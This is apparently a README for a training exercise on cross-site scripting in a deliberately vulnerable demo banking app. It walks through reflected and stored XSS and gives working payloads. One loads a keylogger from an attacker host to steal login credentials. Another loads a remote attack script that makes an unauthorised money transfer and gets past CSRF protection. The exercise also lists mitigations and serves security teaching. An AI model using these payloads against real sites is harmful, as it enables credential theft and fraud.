# Exercise 2 - XXS 

XSS exercise to help ypu understand XSS and its mitigations

## Setup and Start Applications

1. check out exercise1 
   * from command line: 'git checkout exercise1'
1. start the v-bank-app in debug mode
   * with maven command:'mvn clean spring-boot:run -f ./v-bank-app/pom.xml'
1. start the attacker-app
   * woth maven command: 'mvn clean spring-boot:run -f ./attacker-app/pom.xml'
   
## Search for XSS vulnerabilities

Hints:
* This app is a rather traditional multi page application with not much Ajax/Javascript magic. Therefore it is (mostly) susceptible to source based XSS vulnerabilities.
* Look for reflected XSS vulnerabilities where request parameters are directly written to the HTML output (page.tag is template used for all pages)
* Look for stored XSS vulnerabilities where form values are saved without validation/encoding/sanitization and then / or printed without escaping

Present vulnerabilities:
* page.tag template prints a number of requests parameters into the HTML without escaping:
  * *error* : `<div ...>${error}</div>`
  * *info* : `<div ...>${info}</div>` 
  * *message* : `<div ...>${message}</div>`
* *transfer.jsp* and *BankController.doTransfer(...)* save the transfer details without validation/etc. and *history.jsp* displays them w/o escaping

##Exploit and understand
1. Test reflected XSS in login page. You should get an alert pop-up with '1' displayed as the javascript in the request parameter executes: http://vbank.0.0.0.0.xip.io:8080/login?info=%3Cscript%3Ealert(1)%3C/script%3E 
1. Exploit stored XSS in login page:
   * As Alice send Bob the login link with installs a keylogger by exploiting the vulnerability: 
     http://vbank.0.0.0.0.xip.io:8080/login?info=%3Cscript%20src=%22http://attack.0.0.0.0.xip.io:9090/js/keylog.js%22%3E%3C/script%3E 
   * the keylogger send each keystroke to the attack app, the logged keystrokes you can see at http://attack.0.0.0.0.xip.io:9090/viewlog (do not let the browser autofil the form! ...because there are no keystrokes then)
   * This way Alice can steal Bob's login credentials. Even though the keylogger and the log viewer app are by far no perfect
1. Test stored XSS 
   * go to the transfer page and make a transfer to any valid account (i.e. 2-123456-22) with the note '<script>alert(2)</script>'
   * then go to the history page where you should get an alert pop-up with '1' displayed as the javascript entered in the note filed executes.
1. Exploit stored XSS
   * as Alice (alice / h1alice) you know Bob's account number (1-123456-11) and you will transfer him a little amount with the note including a malicious javascript posting a transfer (and overcoming CSRF protection by including the token)
     * The attack script is at http://attack.0.0.0.0.xip.io:9090/js/attack.js; use the method *transfer(formname, fromAccount, toAccount, amount, currency, action)* in the note. 
     * For example: `<script src="http://attack.0.0.0.0.xip.io:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","1000","CHF")</script>`
      * Please transfer 1 CHF to Bob's account with the above note.
   * As Bob logs in and reviews his transactions the malicious script included in Alice's transfer executes and transfers Alice a larger amount without Bob's consent.
     * login as Bob (bob / h3ll0bob) and go to the history page (by clickin on the account number) 
     * the malicious javascript (XSS) should be loaded from the database and executed
     * if you refresh the page you sould see the transaction
  
Mitigations:
  * validate input
  * encode text input (i.e. with HTML encoding)
  * sanitize text/HTML input (remove potentially dangerous char sequences)
  * escape output (replace control characters into renderable counterparts that are not interpreted as controls/commands by the parser)

  
